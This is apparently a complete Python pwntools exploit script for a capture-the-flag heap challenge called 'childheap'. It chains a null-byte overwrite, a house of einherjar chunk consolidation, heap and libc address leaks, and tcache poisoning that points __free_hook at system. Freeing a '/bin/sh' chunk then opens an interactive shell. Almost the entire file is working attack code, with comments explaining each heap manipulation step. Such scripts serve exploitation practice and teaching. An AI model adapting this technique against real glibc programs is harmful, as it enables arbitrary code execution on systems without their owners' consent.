from pwn import *


binpath = './childheap'
elf = ELF(binpath)
libc = elf.libc

context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
b *(0xA93+0x0000555555554000)
ignore 1 88
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper

@debug
def alloc(size, content):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Input Size: ', b'%d' % size)
    io.sendafter(b'Input Content: ', content)


@debug
def delete(y=True):
    io.sendlineafter(b'> ', b'2')
    io.recvuntil(b"Content: '")
    data = io.recvuntil(b"'").rstrip(b"'")
    if y:
        io.sendlineafter(b'[y/n] ', b'y')
    else:
        io.sendlineafter(b'[y/n] ', b'n')
    return data


@debug
def wipe():
    io.sendlineafter(b'> ', b'3')
    io.recvuntil(b'MENU')

for i in range(7):
    alloc(0xf8 + 0x10 * i, b'%d' % i)
    delete()
    wipe()


payload = b''
payload += b'Z' * (0xf8 + 0x10 * 0)
alloc(0xf8 + 0x10 * 0, payload)  # NULL byte  overwrite next chunk's size
delete()
wipe()

payload = b''
payload += b'Z' * (0xf8 + 0x10 * 1)
alloc(0xf8 + 0x10 * 1, payload)  # NULL byte overwrite next chunk's size
delete()  # the size is overwritten to 0x100. free as 0x100 sized chunk
tmp = delete(False)
wipe()

addr_heap = u64(tmp.ljust(8, b'\x00')) - 0x260
print('addr_heap = 0x{:x}'.format(addr_heap))

for i in range(2, 7):
    payload = b''
    payload += b'Z' * (0xf8 + 0x10 * i)
    alloc(0xf8 + 0x10 * i, payload)
    delete()
    wipe()
# Now the tcache list for size 0x100 is full

# I think we don't need this
for i in range(7):
    alloc(0xf8, b'Y')
    delete()
    wipe()

# Prepare for house of einherjar
alloc(0x108, b'A')
delete()
wipe()

alloc(0x118, b'B')
delete()
wipe()

alloc(0x128, b'C')
delete()
wipe()

alloc(0x138, b'D')
delete()
wipe()

payload = b''
payload += b'E' * 0xf8  # userland
payload += p64(0x50 | 1)  # fake size
# this chunk's size will later be overwritten to 0x100 with `alloc(0x138, payload)`
alloc(0x148, payload)
delete()
wipe()

alloc(0x158, b'F')
delete()
wipe()

fake_size = 0x20 + 0x120 + 0x130 + 0x140

payload = b''
payload += b'G' * 0x130
payload += p64(fake_size)  # fake prev size
# NULL Byte overwrite.
# since the following alloc will be allocated from tcache,
# this will overwrite chunk allocated by `alloc(0x148, payload)`.
# it will change the size from 0x151 to 0x100
alloc(0x138, payload)
wipe()

addr_fake_chunk = addr_heap + 0xb90
payload = b''
payload += b'H' * 0xe8  # <- addr_fake_chunk point's here
payload += p64(fake_size | 1)
payload += p64(addr_fake_chunk)  # fd (to pass check in unlink_chunk,
payload += p64(addr_fake_chunk)  # bk     fd and bk has to point to itself)
alloc(0x108, payload)  # write fake chunk header to the first chunk
wipe()

alloc(0x148, b'I')
# Since the size of chunk allocated by alloc(0x148, b'I') is overwritten from 0x151 to 0x100
# this delete try to place the chunk into unsorted bins, in turn triggering house of einherjar.
delete()
wipe()

alloc(0, b'')
tmp = delete(False)
wipe()
addr_libc = u64(tmp.ljust(8, b'\x00')) - 0x1e50b0
print('addr_libc = 0x{:x}'.format(addr_libc))

addr_system = addr_libc + libc.symbols['system']
addr_free_hook = addr_libc + libc.symbols['__free_hook']

payload = b''
payload += b'J' * 0x118
payload += p64(0x130)
payload += p64(addr_free_hook)  # overwrite next of overlapping tcached chunk
alloc(0x178, payload)  # malloc from overlapping chunk
wipe()

alloc(0x128, b'consume')
wipe()
alloc(0x128, p64(addr_system))
wipe()
alloc(0x28, b'/bin/sh')
delete()


io.interactive()
